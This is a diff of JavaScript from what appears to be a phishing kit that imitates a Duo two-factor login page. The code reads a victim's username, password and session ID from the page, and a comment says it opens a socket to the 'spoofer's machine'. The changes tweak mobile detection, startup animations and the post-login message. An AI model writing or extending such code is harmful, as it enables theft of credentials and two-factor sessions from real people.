@@ -3,7 +3,7 @@ function loaded() {
     window.user   = document.getElementById("user").innerHTML;
     window.pass   = document.getElementById("pass").innerHTML;
     window.sid    = document.getElementById("sid").innerHTML;
-    window.mobile = document.getElementById("mobile").innerHTML === "true"? true : false;
+    window.mobile = document.getElementById("mobile").innerHTML.includes("true")? true : false;
     console.log("Session is:", window.sid);
 
     // Opens a new socket that connects to spoofer's machine.
@@ -101,6 +101,8 @@ function loaded() {
     // Play startup loading animations. Different loading for mobile / web
     var frame = document.getElementById("duo_iframe");
     var frameDoc = frame.contentWindow.document;
+
+    frame.contentWindow.loadAnim();
     if (window.mobile) { 
         setTimeout(()=>{
             document.getElementById("duo_help").style.display='block';
@@ -208,11 +210,12 @@ function loaded() {
         }));
     }
     function loginSucc() {
-        window.postMessage({
+        window.postMessage("finished", "*");
+        /*window.postMessage({
             move : '/exit-site/final.html',
             url  : '/' + window.FINAL_DOM.split("/").slice(3).join('/'),
             load : '0'
-        }, '*');
+        }, '*');*/
     }
 };
 
